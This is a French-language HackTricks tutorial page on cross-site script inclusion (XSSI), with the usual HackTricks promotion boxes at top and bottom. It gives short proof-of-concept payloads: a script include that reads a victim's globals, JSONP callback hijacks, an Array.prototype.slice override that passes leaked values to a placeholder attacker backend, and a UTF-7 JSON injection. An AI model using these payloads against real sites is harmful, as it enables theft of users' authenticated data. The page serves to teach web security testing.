# XSSI (Inclusion de script entre sites)

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>


## Informations de base

XSSI d√©signe un type de vuln√©rabilit√© qui exploite le fait que, lorsqu'une **ressource est incluse en utilisant la balise `script`, la SOP ne s'applique pas**, car les scripts doivent pouvoir √™tre inclus entre domaines. Un attaquant peut donc **lire tout** ce qui a √©t√© inclus en utilisant la balise **`script`**.

Cela est particuli√®rement int√©ressant lorsqu'il s'agit de JavaScript dynamique ou de JSONP, lorsque des informations d'autorisation dites d'autorit√© ambiante comme les cookies sont utilis√©es pour l'authentification. Les cookies sont inclus lors de la demande d'une ressource provenant d'un h√¥te diff√©rent.

### Types

1. JavaScript statique (XSSI r√©gulier)
2. JavaScript statique, accessible uniquement lorsque authentifi√©
3. JavaScript dynamique
4. Non-JavaScript

**Les informations suivantes sont un r√©sum√© de [https://www.scip.ch/en/?labs.20160414](https://www.scip.ch/en/?labs.20160414)**. Consultez-le pour plus de d√©tails.


### XSSI r√©gulier
Dans cette approche, des informations priv√©es sont int√©gr√©es dans un fichier JavaScript accessible globalement. Les attaquants peuvent identifier ces fichiers en utilisant des m√©thodes telles que la lecture de fichiers, les recherches de mots-cl√©s ou les expressions r√©guli√®res. Une fois localis√©, le script contenant des informations priv√©es peut √™tre inclus dans un contenu malveillant, permettant un acc√®s non autoris√© √† des donn√©es sensibles. Une technique d'exploitation exemple est pr√©sent√©e ci-dessous:
```html
<script src="https://www.vulnerable-domain.tld/script.js"></script>
<script> alert(JSON.stringify(confidential_keys[0])); </script>
```
### Dynamic-JavaScript-based-XSSI and Authenticated-JavaScript-XSSI
Ces types d'attaques XSSI impliquent l'ajout dynamique d'informations confidentielles au script en r√©ponse √† une requ√™te de l'utilisateur. La d√©tection peut √™tre effectu√©e en envoyant des requ√™tes avec et sans cookies et en comparant les r√©ponses. Si les informations diff√®rent, cela peut indiquer la pr√©sence d'informations confidentielles. Ce processus peut √™tre automatis√© en utilisant des outils comme l'extension Burp [DetectDynamicJS](https://github.com/luh2/DetectDynamicJS).

Si des donn√©es confidentielles sont stock√©es dans une variable globale, elles peuvent √™tre exploit√©es en utilisant des m√©thodes similaires √† celles utilis√©es dans le XSSI r√©gulier. Cependant, si les donn√©es confidentielles sont incluses dans une r√©ponse JSONP, les attaquants peuvent d√©tourner la fonction de rappel pour r√©cup√©rer les informations. Cela peut √™tre fait en manipulant des objets globaux ou en configurant une fonction √† ex√©cuter par la r√©ponse JSONP, comme d√©montr√© ci-dessous:
```html
<script>
var angular = function () { return 1; };
angular.callbacks = function () { return 1; };
angular.callbacks._7 = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=angular.callbacks._7" type="text/javascript"></script>
```

```html
<script>
leak = function (leaked) {
alert(JSON.stringify(leaked));
};
</script>
<script src="https://site.tld/p?jsonp=leak" type="text/javascript"></script>
```
Pour les variables ne r√©sidant pas dans l'espace de noms global, *la falsification de prototype* peut parfois √™tre exploit√©e. Cette technique exploite la conception de JavaScript, o√π l'interpr√©tation du code implique de parcourir la cha√Æne de prototype pour localiser la propri√©t√© appel√©e. En rempla√ßant certaines fonctions, telles que `slice` de `Array`, les attaquants peuvent acc√©der et divulguer des variables non globales :
```javascript
Array.prototype.slice = function(){
// leaks ["secret1", "secret2", "secret3"]
sendToAttackerBackend(this);
};
```
### Non-Script-XSSI
Les d√©tails suppl√©mentaires sur les vecteurs d'attaque peuvent √™tre trouv√©s dans le travail du chercheur en s√©curit√© [Sebastian Lekies](https://twitter.com/slekies), qui maintient une liste de [vecteurs](http://sebastian-lekies.de/leak/).

Takeshi Terada a introduit une autre forme de XSSI, o√π des fichiers Non-Script, tels que des fichiers CSV, sont divulgu√©s en cross-origin en √©tant inclus en tant que sources dans une balise `script`. Des exemples historiques de XSSI, tels que l'attaque de 2006 de Jeremiah Grossman pour lire un carnet d'adresses complet de Google et la fuite de donn√©es JSON de 2007 de Joe Walker, mettent en √©vidence la gravit√© de ces menaces. De plus, Gareth Heyes d√©crit une variante d'attaque impliquant du JSON encod√© en UTF-7 pour √©chapper au format JSON et ex√©cuter des scripts, efficace dans certains navigateurs:
```javascript
[{'friend':'luke','email':'+ACcAfQBdADsAYQBsAGUAcgB0ACgAJwBNAGEAeQAgAHQAaABlACAAZgBvAHIAYwBlACAAYgBlACAAdwBpAHQAaAAgAHkAbwB1ACcAKQA7AFsAewAnAGoAbwBiACcAOgAnAGQAbwBuAGU-'}]
```

```html
<script src="http://site.tld/json-utf7.json" type="text/javascript" charset="UTF-7"></script>
```
<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

D'autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
